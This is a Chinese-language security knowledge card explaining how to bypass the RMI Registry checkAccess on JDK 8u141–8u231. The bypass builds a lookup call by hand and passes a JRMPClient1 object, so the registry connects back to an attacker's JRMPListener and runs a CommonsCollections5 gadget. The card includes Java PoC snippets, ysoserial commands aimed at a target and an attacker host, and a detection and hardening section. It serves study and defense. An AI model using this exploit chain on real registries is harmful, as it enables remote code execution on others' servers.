---
id: web-java-rmi-registry-lookup-checkaccess-jrmp-bypass
title: JDK 8u141+ 绕过 RMI Registry checkAccess：自实现 lookup 传入 Remote 对象，把反序列化引到攻击者 JRMPListener
type: scenario
domain: web
path: web/java/rmi
technique: rmi-registry-lookup-checkaccess-jrmpclient-bypass
aliases:
- JEP290 绕过
- Registry checkAccess 绕过
- LookupBypassJEP290
- RegistryImpl_Skel lookup 反序列化
- releaseInputStream 触发 JRMP 连接
- JRMPClient1 payload
- JDK 8u141 反序列化
tags:
- java
- rmi
- jrmp
- jep290
- checkaccess
- deserialization
- bypass
- ysoserial
- rce
cve: []
severity: high
confidence: medium
affected_versions: JDK 8u141 ~ 8u231（原文：8u121~8u141 可直接用 UnicastRef，8u141~8u231 需 checkAccess + JRMP 组合绕过；8u231 起被 ClassCastException 与 DGC 过滤器封堵）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4
  verified_at: '2026-11-08T20:50:14+08:00'
  notes: 已对照原文核对；本次核对未读取图片；dispatch/checkAccess 源码、0-4 方法号对照、enableReplace=false 自实现 lookup、JRMPClient1、releaseInputStream 触发回连、8u121/8u141/8u231 版本边界均与正文一致。未验证点：原文关于 8u231 的 ClassCastException+discardRefs 与 leaseFilter 结论仅来自调用栈截图，未读图核对；未执行任何 PoC。
---

## 一句话结论

JEP290 之后 RMI 注册中心对 `bind`/`unbind`/`rebind` 加了 `RegistryImpl.checkAccess`（只允许「来源 IP 是本机地址」的调用），但 `lookup` 分支没有这道检查；由于服务端 `lookup` 分支仍是「先 `readObject()`、再强转 `String`」，只要绕过客户端 Stub 的参数类型约束、把一个普通可序列化对象塞进 operation 2 的实参流里，就能让注册中心反序列化攻击者的 gadget，并借 `releaseInputStream()` 触发向攻击者 JRMPListener 的回连，拿到真正的命令执行。

## 原理

- `RegistryImpl.checkAccess(String)` 的实现是：`getClientHost()` 取对端 IP → `InetAddress.getByName` → 若不在 `allowedAccessCache` 中，就 `new ServerSocket(0, 10, 该 IP).close()`。这个「用对端 IP 当本地绑定地址试绑一个临时端口」的技巧，只有在目标 IP 属于本机网卡时才会成功，否则抛 `AccessException: origin /x.x.x.x is non-local host`。因此它实际是「只允许本机来源」，远程攻击者必被拒。
- `RegistryImpl_Skel#dispatch` 的 switch 中，`case 0`（bind）、`case 3`（rebind）、`case 4`（unbind）在反序列化前都调用了 `checkAccess`；`case 2`（lookup）**没有调用**。方法号对照：0 bind / 1 list / 2 lookup / 3 rebind / 4 unbind。
- `case 2` 的代码是 `var7 = (String) var10.readObject();` —— 反序列化先发生、类型转换在后。因此即便传入的对象不是 `String`（随后会抛 `ClassCastException`/`UnmarshalException`），`readObject()` 已经把攻击者的对象树完整还原，gadget 的 `readObject` 逻辑已经执行。
- 正常路径走不通的原因在客户端：`RegistryImpl_Stub#lookup` 只接受一个 `String`，且 `MarshalOutputStream` 在 `enableReplace=true` 时会对 `Remote` 类型实参做替换（改写成远端引用而不是普通序列化）。因此需要自己实现一次 `lookup` 调用：`ref.newCall(registry, operations, 2, interfaceHash)` 直接构造 operation 2 的调用，用反射把流对象的 `enableReplace` 置 `false`，再 `out.writeObject(恶意对象)`。
- 光有「注册中心反序列化」还不够：payload 用 `JRMPClient1`（`RemoteObjectInvocationHandler(UnicastRef(LiveRef(id, TCPEndpoint(攻击者IP, 端口))))`），它只是把 `ref` 填进去，**真正发起连接的是 Skel 里 `finally` 的 `var2.releaseInputStream()`**：DGC 的 `dirty` 流程会 `newCall` → `writeObject` → `invoke`，向 LiveRef 指向的攻击者 JRMP 端点发起连接，并反序列化对方返回的数据；攻击者 JRMPListener 回一个 CommonsCollections 序列化串，就在受害 JVM 里完成 RCE。
- 不能直接用 `JRMPClient` 载荷：`AnnotationInvocationHandler` 包装会让服务端抛 `REJECTED`。原文的做法是另写 `JRMPClient1`，其反序列化从 `RemoteObject#readObject` 开始，天然满足 `(String)` 强转之前的对象构造要求。
- 版本边界：8u121 起 JEP290 拒绝 `bind` 远程来源；8u141 起 `checkAccess` 生效，所以 8u121~8u141 之间用 `UnicastRef` 老链即可，8u141~8u231 才需要本卡这套 `lookup + JRMP` 组合。

## 触发条件

- 目标暴露 RMI Registry 端口（默认 1099），且 JDK 处于 8u141 ~ 8u231 区间（有 `checkAccess`，但 `lookup` 分支仍无检查、强转仍晚于 `readObject`）。
- 注册中心侧 classpath 存在可用 gadget（原文用 CommonsCollections5，1.8 下 CC1 不可用）。
- 攻击者能起 `ysoserial.exploit.JRMPListener`，且受害机能主动连回攻击者的 JRMP 端口（出网/横向可达）。
- 攻击者本地能运行改写过的 ysoserial（自定义 `Naming.lookup` 与 `JRMPClient1`）。

## 利用步骤

1. 端口扫描定位 1099，先用 `registry.list()` 之类正常调用确认是 RMI Registry 且可连。
2. 攻击端起 JRMPListener，绑定一条可用 gadget 与待执行命令。
3. 用改写后的 `LookupBypassJEP290` 向目标注册中心发起 operation 2 调用，实参为 `JRMPClient1` 构造的 `Remote` 对象（`enableReplace=false`）。
4. 注册中心 `readObject` 还原该对象，`releaseInputStream()` 触发 DGC 流程向 JRMPListener 回连。
5. JRMPListener 返回序列化 gadget，受害 JVM 反序列化即执行命令；注册中心侧最终会抛 `ClassCastException`，但命令已执行，属正常现象。
6. 若要复现边界：JDK 8u231 起每个 case 都补了 `ClassCastException` 捕获并调用 `StreamRemoteCall#discardPendingRefs` → `discardRefs()` 清空 `incomingRefTable`，切断这段二次回连；同时 `DGCImpl_Stub#dirty` 增加 `setObjectInputFilter(leaseFilter)`，只放行 `UID/VMID/Lease/Throwable/StackTraceElement/ArrayList/Object/Collections$*` 等白名单类型，`UnicastRef` 系 gadget 被 `REJECTED`。

## PoC

最小复现的两段关键代码（原文改写 ysoserial，未在本机执行）：

```java
// 1) 自实现 operation 2 的调用，绕开 Stub 的 String 参数约束
RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry, "ref");
long interfaceHash = Long.valueOf(String.valueOf(Reflections.getFieldValue(registry, "interfaceHash")));
Operation[] operations = (Operation[]) Reflections.getFieldValue(registry, "operations");
RemoteCall call = ref.newCall((RemoteObject) registry, operations, 2, interfaceHash);
ObjectOutput out = call.getOutputStream();
Reflections.setFieldValue(out, "enableReplace", false); // 关键：禁用 Remote 替换，按普通对象序列化
out.writeObject(obj);                                    // obj = JRMPClient1 载荷
ref.invoke(call);
```

```java
// 2) JRMPClient1：只填充 ref，连接由服务端 releaseInputStream() 发起
ObjID id = new ObjID(new Random().nextInt());
TCPEndpoint te = new TCPEndpoint(attackerHost, attackerPort);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
Remote obj = new RemoteObjectInvocationHandler(ref);
```

命令行形态（示意）：

```text
# 攻击端监听，托管 gadget 与命令
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 "cmd.exe /c calc"
# 打注册中心，把反序列化引到上面的 JRMP 端点
java -cp ysoserial.jar ysoserial.exploit.LookupBypassJEP290 <目标IP> 1099 <攻击者IP>:1088
```

## 变体与关联

- **变体一**：注册中心走 SSL 时，客户端先用 `RMISSLClientSocketFactory`（信任全部证书）试探性 `list()`，失败再切 TLS 重连。
- **变体二**：`DGC`、`Activator`、JMX `RMIConnector` 等其它 JRMP 端点同样存在「反序列化先于业务校验」的结构，`checkAccess` 只保护了 Registry 的三条写操作。
- **变体三**：只用 `UnicastRef` 直接回连（不经 `lookup`）在 8u231 后会被 DGC 的 `leaseFilter` 拒掉，此时要换本地工厂/`JNDI` 型不出网链。
- **关联**：[[web-java-rmi-jrmp-exceptional-return-jndi-jdk21-bypass]]（同为恶意 JRMP 端回连，但那条是 JDK 21 JNDI 过滤器下的异常对象绕过）、[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（同版本窗内的远程 codebase 类加载路线）。

## 检测与防御

- **网络侧**：1099 及 DGC 随机高端口不对业务网段外暴露；对注册中心发起的「目标实参不是 String 的 operation 2 调用」无法在协议层直观识别，但可用 RMI 流量特征（`JRMI` 魔数 + 非常规序列化流）加 IDS 规则。
- **出站监控**：受害主机向非业务 IP 的高端口发起 JRMP 风格 TCP + 序列化数据，是 `releaseInputStream()` 回连的强特征；对 `sun.rmi.transport.tcp.TCPChannel` 的出连做告警。
- **加固**：升级到 8u231+ 并保留 `ObjectInputFilter`/`jdk.serialFilter` 白名单；能用 `LocateRegistry` 本地绑定的就不要远程暴露注册中心；严禁在注册中心进程 classpath 中堆放 commons-collections 等 gadget 库。
- **审计**：检查是否存在 `RMISecurityManager` 缺失、`java.rmi.server.useCodebaseOnly=false` 等历史配置；对 JMX/RMI 端点统一收敛到跳板机访问。
